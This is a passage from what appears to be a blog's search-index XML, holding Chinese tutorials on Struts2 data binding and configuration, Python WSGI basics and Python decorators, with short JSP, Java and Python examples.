value=&quot;提交&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>//数据封装的方式二:属性驱动-在页面中提供表达式的方式public class UserAction2 extends ActionSupport {    // 提供一个私有对象    private User user;    //拦截器进行的数据封装    // 提供user的set和get方法:get方法是必须的    public User getUser() {        return user;    }    public void setUser(User user) {        this.user = user;    }    public String execute() {        System.out.println(user);        return NONE;    }}</code></pre><h1 id="模型驱动-实现ModelDriven接口-常用"><a href="#模型驱动-实现ModelDriven接口-常用" class="headerlink" title="模型驱动:实现ModelDriven接口(常用)"></a>模型驱动:实现ModelDriven接口(常用)</h1><p>JSP</p><pre><code>&lt;h3&gt;方式一:模型驱动-模型驱动的方式&lt;/h3&gt;    &lt;form action=&quot;userAction3&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;用户名:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;密码:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;年龄:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;生日:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;birthday&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;工资:&lt;/td&gt;                &lt;td&gt;                    &lt;input type=&quot;text&quot; name=&quot;salary&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;                    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>//数据封装的方式3:采用模型驱动的方式public class UserAction3 extends ActionSupport implements ModelDriven&lt;User&gt; {    private User user = new User(); // 模型驱动的方式必须手动提供对象的实例    public User getModel() {        // 模型驱动需要使用的方法        return user;    //这里必须返回上面那个实例化的对象    }    public String execute() {        System.out.println(user);        return NONE;    }}</code></pre><h1 id="复杂的数据封装"><a href="#复杂的数据封装" class="headerlink" title="复杂的数据封装"></a>复杂的数据封装</h1><h2 id="将数据封装到List中"><a href="#将数据封装到List中" class="headerlink" title="将数据封装到List中"></a>将数据封装到List中</h2><pre><code>&lt;h3 align=&quot;center&quot;&gt;1:封装到List集合中:批量插入商品&lt;/h3&gt;    &lt;form action=&quot;goodsAction1.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;商品名称&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;goods[0].name&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;商品价格&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;goods[0].price&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;商品名称&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;goods[1].name&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;商品价格&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;goods[1].price&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;商品名称&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;goods[2].name&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;商品价格&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;goods[2].price&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>public class GoodsAction1 extends ActionSupport {    private List&lt;Goods&gt; goods;    public void setGoods(List&lt;Goods&gt; goods) {        this.goods = goods;    }    public List&lt;Goods&gt; getGoods() {        return goods;    }    public String execute() {        for (Goods good : goods) {            System.out.println(good);        }        return NONE;    }}</code></pre><h2 id="将数据封装到"><a href="#将数据封装到" class="headerlink" title="将数据封装到"></a>将数据封装到</h2><p>JSP</p><pre><code>h3 align=&quot;center&quot;&gt;1:封装到map集合中:批量插入商品&lt;/h3&gt;    &lt;form action=&quot;goodsAction2.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;商品名称&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;map[&#39;one&#39;].name&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;商品价格&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;map[&#39;one&#39;].price&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;商品名称&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;map[&#39;two&#39;].name&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;商品价格&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;map[&#39;two&#39;].price&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;商品名称&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;map[&#39;three&#39;].name&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;商品价格&lt;/td&gt;                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;map[&#39;three&#39;].price&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt;            &lt;/tr&gt;        &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>import java.util.Map;import com.opensymphony.xwork2.ActionSupport;import domain.Goods;public class GoodsAction2 extends ActionSupport {    private Map&lt;String,Goods&gt; map;            public Map&lt;String, Goods&gt; getMap() {        return map;    }    public void setMap(Map&lt;String, Goods&gt; map) {        this.map = map;    }    public String execute(){        for (String key : map.keySet()) {            Goods goods = map.get(key);                    System.out.println(key + &quot;\t&quot; + goods);        }        return NONE;    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2常见配置</title>
      <link href="/2018/12/22/struts2-chang-jian-pei-zhi/"/>
      <url>/2018/12/22/struts2-chang-jian-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="配置XML提示"><a href="#配置XML提示" class="headerlink" title="配置XML提示"></a>配置XML提示</h1><h1 id="Action的配置"><a href="#Action的配置" class="headerlink" title="Action的配置"></a>Action的配置</h1><h2 id="package标签配置"><a href="#package标签配置" class="headerlink" title="package标签配置"></a>package标签配置</h2><p>package标签是包,他的作用是为了更好的管理Action.</p><p>package标签的常用属性</p><ul><li>name:包的名称,在一个Struts2项目中可以随便定义,只要<strong>不重名即可</strong></li><li>extends:继承的包,一般<strong>继承struts-default</strong></li><li>namespace:名称空间,<strong>与action标签中的name属性共同决定了访问路径</strong><ul><li>名称空间的三种不同的写法<ul><li>带名称的名称空间:namespace=”/test”</li><li><strong>根名称空间:namespace=”/“</strong></li><li>默认名称空间:namespace=””</li></ul></li></ul></li><li>abstract:声明包是抽象包</li></ul><h2 id="Action标签的配置"><a href="#Action标签的配置" class="headerlink" title="Action标签的配置"></a>Action标签的配置</h2><p>Action标签将标识符映射到处理程序类。当请求与操作名称匹配时，框架使用映射来确定如何处理请求。</p><p>action标签的常用属性</p><ul><li><strong>name:与namespace共同决定浏览器访问路径</strong><ul><li>假如请求<a href="http://www.planetstruts.org/struts2-mailreader/**Welcome.action将映射到Welcome类去操作*" target="_blank" rel="noopener">http://www.planetstruts.org/struts2-mailreader/**Welcome.action将映射到Welcome类去操作*</a>*</li></ul></li><li>class:<strong>Action类的全路径</strong></li><li>method:<strong>用于确定执行Action类中的某个方法,默认执行的是Action类中的execute方法</strong></li><li>converter:Struts2框架中的类型转换</li></ul><h1 id="常量配置"><a href="#常量配置" class="headerlink" title="常量配置"></a>常量配置</h1><h2 id="Struts常量配置"><a href="#Struts常量配置" class="headerlink" title="Struts常量配置"></a>Struts常量配置</h2><p>查看Struts常量</p><p><strong>/org/apache/struts2/default.properties</strong></p><p><img src="" alt="常见配置"></p><ul><li>struts.i18n.encoding=UTF-8:<strong>Struts2框架默认编码格式是UTF-8</strong></li><li>struts.action.extension=action:Struts2请求的<strong>默认扩展名</strong></li></ul><p>修改常量的值的方法</p><ul><li>在struts.xml中修改常量<strong>(常用方法)</strong><ul><li><img src="" alt="修改常量"></li></ul></li><li>直接修改default.properties</li><li>通过web.xml修改常量</li></ul><h2 id="多个Struts-xml配置文件的配置"><a href="#多个Struts-xml配置文件的配置" class="headerlink" title="多个Struts.xml配置文件的配置"></a>多个Struts.xml配置文件的配置</h2><p>当我们有多个包的时候,不能将所有的struts配置都写在一个struts.xml文件中,这样的做法会给我们后期维护带来阻碍.对于大型应用程序，最好使用多个配置文件，以便管理应用程序</p><p>可以创建许多配置文件，但需要在struts.xml文件中定义它。<strong>struts的include子元素用于定义支持的配置文件。</strong></p><p><img src="" alt="多配置文件"></p><h1 id="Action的写法"><a href="#Action的写法" class="headerlink" title="Action的写法"></a>Action的写法</h1><h2 id="Action类是一个POJO"><a href="#Action类是一个POJO" class="headerlink" title="Action类是一个POJO"></a>Action类是一个POJO</h2><p><img src="" alt="POJO"><br>维基百科对POJO的描述:</p><blockquote><p>在软件工程中，普通旧Java对象（POJO）是一个普通的Java 对象，不受任何特殊限制的约束，也不需要任何类路径。该术语由Martin Fowler，Rebecca Parsons和Josh MacKenzie于2000年9月创造：[1]</p></blockquote><blockquote><p>“我们想知道为什么人们如此反对在他们的系统中使用常规物体，并得出结论认为这是因为简单的物体缺乏一个奇特的名字。所以我们给了他们一个，它很好地被捕获了。” [1]</p></blockquote><blockquote><p>术语“POJO”最初表示Java对象，它不遵循任何主要的Java对象模型，约定或框架; 现在，“POJO”也可以用作“Plain Old JavaScript Object” 的首字母缩写词，在这种情况下，该术语表示类似谱系的JavaScript对象。[2]</p></blockquote><blockquote><p>术语继续旧的条款对于不使用花哨的新功能，如POTS（技术型普通老式电话服务的）电话波德（普通旧文档中）的Perl。与.NET框架上的POJO相当的是Plain Old CLR Object（POCO）。[3]对于PHP，它是Plain Old PHP Object（POPO）。[4] [5]</p></blockquote><blockquote><p>POJO现象最有可能获得广泛接受，因为需要一个与复杂对象框架形成对比的通用且易于理解的术语</p></blockquote><h2 id="Action类实现Action接口"><a href="#Action类实现Action接口" class="headerlink" title="Action类实现Action接口"></a>Action类实现Action接口</h2><p><img src="" alt="实现接口"></p><h1 id="访问Action的不同方式"><a href="#访问Action的不同方式" class="headerlink" title="访问Action的不同方式"></a>访问Action的不同方式</h1><h2 id="通过action标签的method属性访问"><a href="#通过action标签的method属性访问" class="headerlink" title="通过action标签的method属性访问"></a>通过action标签的method属性访问</h2><p><img src="" alt="actionmethod"><br><strong>Action类中有四个不同的方法,当我们访问某个方法的时候执行某个action</strong><br><strong>在struts.xml中的使用action标签的method属性访问action</strong></p><h2 id="通过通配符的方式进行action的访问"><a href="#通过通配符的方式进行action的访问" class="headerlink" title="通过通配符的方式进行action的访问"></a>通过通配符的方式进行action的访问</h2><p><img src="" alt="通配符的访问"></p><h2 id="动态访问"><a href="#动态访问" class="headerlink" title="动态访问"></a>动态访问</h2><p><strong>通过使用struts.xml的方法修改Struts配置开启动态方法访问</strong></p><pre><code>&lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;true&quot;&gt;&lt;/constant&gt;</code></pre><p>书写action标签</p><pre><code>&lt;action name=&quot;customer&quot; class=&quot;test.demo3.CustomerAction&quot;&gt;&lt;/action&gt;</code></pre><p><strong>然后再JSP页面配置访问路径</strong></p><pre><code>    &lt;!--前面写上Actionname的名称中间写个!,后面是方法的名称 --&gt;    &lt;a href=&quot;${ pageContext.request.contextPath }/customer!find.action&quot;&gt;查询客户&lt;/a&gt;    &lt;br /&gt;    &lt;a href=&quot;${ pageContext.request.contextPath }/customer!update.action&quot;&gt;修改客户&lt;/a&gt;    &lt;br /&gt;    &lt;a href=&quot;${ pageContext.request.contextPath }/customer!delete.action&quot;&gt;删除客户&lt;/a&gt;    &lt;br /&gt;    &lt;a href=&quot;${ pageContext.request.contextPath }/customer!save.action&quot;&gt;保存客户&lt;/a&gt;</code></pre><p><strong>JSP页面书写方法:前面写上Actionname的名称中间写个!,后面是方法的名称</strong></p><p><img src="" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PythonWeb编程WSGI</title>
      <link href="/2018/12/05/pythonweb-bian-cheng-wsgi/"/>
      <url>/2018/12/05/pythonweb-bian-cheng-wsgi/</url>
      
        <content type="html"><![CDATA[<h1 id="动态网站和静态网站的区别"><a href="#动态网站和静态网站的区别" class="headerlink" title="动态网站和静态网站的区别"></a>动态网站和静态网站的区别</h1><p>我们现在使用的网站可以分为静态网站和动态网站,本博客就是一个静态网站,</p><p>静态网站:</p><p><strong>StaticWebsite</strong></p><blockquote><p>无论何时访问它，静态网页都会显示完全相同的信息。静态网页不必是简单的纯文本。他们可以提供详细的多媒体设计甚至视频。但是，每次访问该页面时，每个访问该页面的访问者都会受到完全相同的文本，多媒体设计或视频的欢迎，直到您更改该页面的源代码。</p></blockquote><p>动态网站:</p><p><strong>DynamicWebsite</strong></p><blockquote><p>动态网页能够从同一源代码文件为不同的访问者生成不同的内容。网站可以根据访问者使用的操作系统或浏览器显示不同的内容，无论是使用PC还是移动设备，甚至是引用访问者的来源。动态Web页面不一定比静态Web页面更好。这两个只是用于不同的目的。</p></blockquote><p><strong>直白的来说就是静态网站的页面是一成不变的,如果需要改变需要修改网站的源码.动态网站是访问不同页面根据相同的页面源码对不同的用户展示不同的内容并且还可以与数据库交互以向用户显示临时信息.</strong></p><p>那么如何使用Python编写动态网站呢?</p><p>Python中有很多优秀的Web框架,大家熟知的Django,Flask都是创建动态网站的优秀框架.</p><h2 id="Web服务器对静态请求和动态请求的处理方式"><a href="#Web服务器对静态请求和动态请求的处理方式" class="headerlink" title="Web服务器对静态请求和动态请求的处理方式"></a>Web服务器对静态请求和动态请求的处理方式</h2><p>静态请求:</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/z4ABjBx5Gl.PD8kZLanPzXQJvO2usdyTAJVdQXhBOSs!/b/dL0AAAAAAAAA&amp;bo=AAQAAwAAAAARFyc!&amp;rf=viewer_4" alt="静态请求"></p><p>直接获取数据,并返回给浏览器数据</p><p>动态请求:</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/JxzOOVu0ZR0LMOM4.YiY3SDzAothtUCBsxrtRwQ2ij8!/b/dLwAAAAAAAAA&amp;bo=AAQAAwAAAAARBzc!&amp;rf=viewer_4" alt="动态请求"></p><p>Web服务器交给web框架处理,web框架处理完之后交给Web服务器,Web服务器再返回给浏览器.</p><h2 id="服务器请求动态页面过程"><a href="#服务器请求动态页面过程" class="headerlink" title="服务器请求动态页面过程"></a>服务器请求动态页面过程</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/SH1CU*8l8ZMGCayJUu7mViswwEP2ItLqZ6CTQGNFQ8U!/b/dLwAAAAAAAAA&amp;bo=mgRHAgAAAAADJ9k!&amp;rf=viewer_4" alt="服务器请求动态页面过程"></p><h1 id="WSGI"><a href="#WSGI" class="headerlink" title="WSGI"></a>WSGI</h1><p>什么是WSGI呢?WSGI有什么用呢?WSGI的出现解决了什么问题呢?</p><p>在讲解WSGI之前让我们想一个问题:</p><p>在Web服务器上运行一个Django应用或者Flask应用,如何在不做任何改变的情况下适应不同的Web架构呢?</p><p>在以前(2003年)选择Pythonweb架构会受制于可用的Web服务器,就是说有的服务器可以使用PythonWeb架构有的服务器不能使用.</p><p>WSGI的出现就解决了这样的问题.</p><p>WSGI允许开发者将选择web框架和web服务器分开。可以混合匹配web服务器和web框架，选择一个适合的配对比如可以在Nginx上运行Django或者Flask.</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/PoM84ROFDgB2mWFgyVblKqIpXO7y00gQvh60d6EiOFM!/b/dLkAAAAAAAAA&amp;bo=MgTdAQAAAAADF9g!&amp;rf=viewer_4" alt=""></p><blockquote><p>WSGI是Web服务器网关接口。它是一个描述Web服务器如何与Web应用程序通信的规范。它是Python的框架。它最初是在2003年指定的.WSGI已经成为Python Web应用程序开发的标准。WSGI已在PEP 3333中指定 。摘要说：“本文档规定了Web服务器和Python Web应用程序或框架之间的标准接口，以促进各种Web服务器上的Web应用程序可移植性。</p></blockquote><p><strong>web服务器必须具备WSGI接口，所有的现代Python Web框架都已具备WSGI接口，它让你不对代码作修改就能使服务器和特点的web框架协同工作。</strong></p><h1 id="定义WSGI接口"><a href="#定义WSGI接口" class="headerlink" title="定义WSGI接口"></a>定义WSGI接口</h1><p>定义WSGI非常简单,只需要我<strong>们实现一个函数,就可以响应服务器的HTTP请求.</strong></p><pre><code>from wsgiref.simple_server import make_serverdef application(environ, start_response):    start_response(&quot;200 OK&quot;, [(&quot;Content-type&quot;, &quot;text/plain&quot;)])    return [&quot;Hello WSGI&quot;.encode(&quot;utf-8&quot;)]server = make_server(&#39;localhost&#39;, 8080, application)server.serve_forever()</code></pre><p>Output</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/qmR*z1bpj7eElIFfoYsLjbJHLgvgt6HNKae18avQgEE!/b/dL8AAAAAAAAA&amp;bo=3ASUAAAAAAADF34!&amp;rf=viewer_4" alt=""></p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/DFwkgmOE70C0GgLtq.R0KYy22i13maMyJH8fKvl6Ml0!/b/dDcBAAAAAAAA&amp;bo=fgKXAAAAAAADB8k!&amp;rf=viewer_4" alt=""></p><p>这里的<strong>函数application</strong>就是符合WSGI标准的一个HTTP处理函数,它接收两个参数:</p><p><strong>environ:一个包含所有HTTP请求信息的dict对象</strong></p><p><strong>start_response:一个发送给服务器的HTTP响应的函数,start_response必须是可调用的，具有三个参数：status，response_headers，exc_info = None</strong></p><p>整个application()函数本身没有涉及到任何解析HTTP的部分，也就是说，<strong>把底层web服务器解析部分和应用程序逻辑部分进行了分离.这样开发者就可以专心做一个领域了</strong></p><p>如何调<strong>用这个application函数?如果自己调用的话两个重要的参数environ,start_response无法提供,返回的响应也无法发给浏览器.所以说application()函数必须由WSGI服务器来调用.</strong></p><p>这里是我自己写的Web服务器中调用application的情况</p><p><img src="http://a2.qpic.cn/psb?/V10Lajvl1FgUNv/3DPwBOSQWgdo7H1VgBVB*16tS5lMccNvjPsx2FQi.K8!/m/dL0AAAAAAAAAnull&amp;bo=4QSmAgAAAAADB2M!&amp;rf=photolist&amp;t=5" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WSGI </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python装饰器</title>
      <link href="/2018/12/04/python-zhuang-shi-qi/"/>
      <url>/2018/12/04/python-zhuang-shi-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="理解Python装饰器的前提"><a href="#理解Python装饰器的前提" class="headerlink" title="理解Python装饰器的前提"></a>理解Python装饰器的前提</h1><h2 id="装饰器是什么"><a href="#装饰器是什么" class="headerlink" title="装饰器是什么"></a>装饰器是什么</h2><p>Python中的装饰器是<strong>任何可调用的Python对象</strong>,用于<strong>修改函数或类</strong>,对于函数’func’和类’C’的<strong>引用</strong>被传递给装饰器,<strong>装饰器返回修改的函数或者类</strong>.修改后的函数或类通常包含对原始函数’func’或类’C’的<strong>调用</strong>.</p><p>简单来说:<br>装饰器接收一个函数作为参数,添加一些功能并返回它.</p><p>装饰器在进行装饰的过程类似于现实生活中给一个东西进行包装,装饰器充当外包装,被装饰的物品性质不变,只不过变得更加好看了.</p><h2 id="Python中的对象"><a href="#Python中的对象" class="headerlink" title="Python中的对象"></a>Python中的对象</h2><p>Python中的所有内容都是对象,我们定义的<strong>名称只是绑定到这些对象的标识符</strong>.<strong>函数也不例外</strong>,<strong>函数也是对象</strong>.</p><p>通过下面的例子,理解函数也是对象,</p><pre><code>def first(name):    print(f&#39;My name is:{name}&#39;)first(&quot;张三&quot;)second = first      # 将变量second绑定到first函数对象这时候first和second都指向同一个对象second(&quot;李四&quot;)</code></pre><p>在这里我们定义了一个函数first,接下来调用这个函数,传递给first函数一个实参”张三”,然后我们又将first函数的引用赋值给了second,这里需要注意的是当我们定义一个函数之后<strong>执行函数的时候使用函数名()</strong>,函数名后面不带括号表示,对这个对象的引用(函数也是对象).</p><h2 id="函数可以作为参数进行传递"><a href="#函数可以作为参数进行传递" class="headerlink" title="函数可以作为参数进行传递"></a>函数可以作为参数进行传递</h2><p>既然<strong>函数也是对象</strong>的话,<strong>函数也可以作为参数传递给另一个函数</strong>,<br>类似的例子是python中的map(),filter()…函数,<br>他们都可以接收一个函数作为他们的一个参数.</p><p>将函数的引用传递给另一个函数的例子:</p><pre><code>def inc(x):    return x + 1def dec(x):    return x - 1def operate(func,x):    result = func(x)    return resultresult = operate(inc,10)result2 = operate(dec,10)print(result)print(result2)</code></pre><p><strong>Python中的所有东西都是一个对象</strong>,<strong>几乎所有的东西都有属性和方法</strong>,<br>函数也是对象,所以他们也有像其他对象一样的属性,<br><strong>所有函数都有一些内置属性</strong>:<br>__doc__,__name__,__module__<br>当然<strong>函数也可以有自己的自定义属性</strong>.</p><p>使用函数的内置属性查看函数的名字.</p><pre><code>def funcA():    return &#39;A&#39;def funcB(A):    return f&#39;函数A的__name__属性:{A.__name__}&#39;print(funcB(funcA))</code></pre><p>OutPut</p><pre><code>函数A的__name__属性:funcA</code></pre><h2 id="一个函数返回另一个函数"><a href="#一个函数返回另一个函数" class="headerlink" title="一个函数返回另一个函数"></a>一个函数返回另一个函数</h2><pre><code>def is_caller():    def is_returned():        print(&#39;Hello&#39;)    return is_returnednew = is_caller()       # 调用外部函数,返回内部函数的引用,将这个引用赋值给一个变量newnew()           #通过new,调用内部函数print(new.__name__)         # 通过使用函数的内置属性__name__查看调用的是哪个函数</code></pre><p>OutPut</p><pre><code>Hellois_returned</code></pre><h1 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h1><p>定义一个简单的装饰器</p><pre><code># -*- coding: utf-8 -*-&quot;&quot;&quot;   File Name:装饰器实现   Date：2018/12/3   Change Activity:2018/12/3   Description:   实现一个装饰器,使用p_docorate装饰get_text   p_docorate以get_text为参数,生成一个函数my_get   增加原函数的功能,然后返回生成的函数.&quot;&quot;&quot;def p_docorate(func):    def func_wrapper(name):        return f&#39;&lt;p&gt;{func(name)}&lt;/p&gt;&#39;    return func_wrapper@p_docorate # 等价于:p_docorate(get_text)def get_text(name):    return f&#39;你喜欢{name}&#39;my_get = p_docorate(get_text)print(my_get(&quot;张三&quot;))print(get_text.__name__)        # 每个python函数中都有一个__name__属性,除非特别指定,否则类的对象不具有此属性</code></pre><p>OutPut:</p><pre><code>&lt;p&gt;&lt;p&gt;你喜欢张三&lt;/p&gt;&lt;/p&gt;func_wrapper</code></pre><p>第二个例子:</p><pre><code># -*- coding: utf-8 -*-&quot;&quot;&quot;   File Name:装饰器实现2   Date：2018/12/3   Change Activity:2018/12/3   Description:   装饰器接收一个函数作为参数,添加功能并返回它&quot;&quot;&quot;def make_pretty(func):    def inner():        print(&quot;已装饰&quot;)        print(&quot;调用传递过来的函数&quot;)        func()    return inner@make_pretty        # 等价于:make_pretty(ordinary)def ordinary():    &quot;&quot;&quot;普通函数&quot;&quot;&quot;    print(&quot;这是一个普通函数&quot;)# ordinary()# ordinary = make_pretty(ordinary)      # 装饰器接受一个函数作为参数,添加功能并返回这个函数,返回的函数被命名为prettyordinary()</code></pre><h2 id="使用装饰器装饰带有参数的函数"><a href="#使用装饰器装饰带有参数的函数" class="headerlink" title="使用装饰器装饰带有参数的函数"></a>使用装饰器装饰带有参数的函数</h2><p>divide是一个普通函数,这个函数的功能是返回他的两个参数相除的结果,但是在数学中我们知道,除数是不能为0的,如果我们将0作为除数传递给函数,那么肯定会报错的.我们如何解决这样的问题呢?答案就是使用装饰器,让装饰器去检查传递给divide的参数.</p><pre><code>def smart_divide(func):    def inner(a, b):        print(&#39;对b进行判断&#39;)        if b == 0:            print(&#39;b等于0&#39;)            return &#39;计算错误&#39;        else:            print(&#39;b没有等于0,可以执行计算&#39;)            return func(a, b)    return inner@smart_dividedef divide(a, b):    return a / bprint(divide(10, 2))print(divide(10, 0))</code></pre><p>OutPut:</p><pre><code>对b进行判断b没有等于0,可以执行计算5.0对b进行判断b等于0计算错误</code></pre><p>在上面的例子(divide)中,我们的装饰器(inner)只能传递两个固定的参数,但是如果我们需要传递多个参数该怎么办呢?答案就是使用*args,和**kwargs,这两个函数的参数一个是返回元组,一个是返回字典.我们可以在传递给inner的时候进行传递这两个参数,在调用的时候<strong>对这两个特殊的参数进行解包</strong></p><pre><code>def smart_divide(func):    def inner(*args, **kwargs):        print(&#39;对b进行判断&#39;)        if args == 0 or kwargs == 0:            print(&#39;b等于0&#39;)            return &#39;计算错误&#39;        else:            print(&#39;b没有等于0,可以执行计算&#39;)            return func(*args, **kwargs)        # 解包    return inner@smart_dividedef divide(a, b):    return a / b</code></pre><h2 id="装饰器带有参数"><a href="#装饰器带有参数" class="headerlink" title="装饰器带有参数"></a>装饰器带有参数</h2><p>当装饰器带有参数的时候,我们最重要的是要明白参数之间的调用,</p><pre><code>def tags(tag_name):    def tags_decorator(func):        def func_wrapper(name):            return f&#39;&lt;{tag_name}&gt;{func(name)}&lt;/{tag_name}&gt;&#39;        return func_wrapper    return tags_decorator@tags(&quot;a&quot;)        # 给装饰器传递参数def get_text(name):    return f&quot;Hello{name}&quot;print(get_text(&quot;张三&quot;))</code></pre><p>OutPut</p><pre><code>&lt;a&gt;Hello张三&lt;/a&gt;</code></pre><p><strong>第二个例子</strong></p><pre><code>def set_parent(num):    &quot;&quot;&quot;保存传递过来的参数(num = 1)&quot;&quot;&quot;    def set_func(func):        &quot;&quot;&quot;保存传递过来的参数(Tst1的引用)&quot;&quot;&quot;        def call_func(*args, **kwargs):            &quot;&quot;&quot;调用Tst1的引用,使用最外层的值&quot;&quot;&quot;            if num == 1:                print(&quot;权限验证1---&quot;)            else:                print(&#39;权限验证2---&#39;)            return func()        return call_func    return set_func@set_parent(1)  # 1调用set_func并且将1当作实参传递.2用上一步调用的返回值当作装饰器对Tst1函数进行装饰def Tst1():    print(&quot;test1&quot;)    return &quot;OK&quot;@set_parent(2)def Tst2():    print(&#39;test2&#39;)    return &#39;OK&#39;if __name__ == &#39;__main__&#39;:    Tst1()    Tst2()</code></pre><p>OutPut</p><pre><code>权限验证1---test1权限验证2---test2</code></pre><h2 id="对实例方法进行装饰"><a href="#对实例方法进行装饰" class="headerlink" title="对实例方法进行装饰"></a>对实例方法进行装饰</h2><pre><code>def p_decorate(func):    def func_wrapper(self):        return f&#39;&lt;p&gt;{func(self)}&lt;/p&gt;&#39;    return func_wrapperclass Person(object):    def __init__(self):        &#39;&#39;&#39;初始化方法,通过类创建对象时自动执行&#39;&#39;&#39;        self.name = &quot;张三&quot;        self.age = 18        self.family = &#39;中国河南&#39;    @p_decorate    def get_fullname(self):        return f&#39;地址:{self.family}\t名字:{self.name}\t年龄:{self.age}&#39;new_Person = Person()       #实例化对象print(new_Person.get_fullname())</code></pre><p>OutPut</p><pre><code>&lt;p&gt;地址:中国河南    名字:张三    年龄:18&lt;/p&gt;</code></pre><h2 id="使用装饰器统计函数运行时间"><a href="#使用装饰器统计函数运行时间" class="headerlink" title="使用装饰器统计函数运行时间"></a>使用装饰器统计函数运行时间</h2><pre><code>import timedef set_func(fun):    def call_func():        start_time = time.time()        fun()        stop_time = time.time()        print(&quot;运行时间%f&quot; % (stop_time - start_time))    return call_func@set_funcdef ceshi():    print(&quot;-------测试函数--------&quot;)    for i in range(100000000):        passceshi()</code></pre><p>OutPut</p><pre><code>-------测试函数--------运行时间1.851081</code></pre><h2 id="对不定长参数的函数进行装饰"><a href="#对不定长参数的函数进行装饰" class="headerlink" title="对不定长参数的函数进行装饰"></a>对不定长参数的函数进行装饰</h2><pre><code>def set_func(func):    def call_func(*args, **kwargs):        print(&quot;------内部函数------&quot;)        func(*args, **kwargs)       # 解包    return call_func@set_funcdef ceshi1(num, *args, **kwargs):    print(&#39;------------Num1:-----------%d&#39; % num)    print(&#39;------------Num1:-----------&#39;, args)    print(&#39;------------Num1:-----------&#39;, 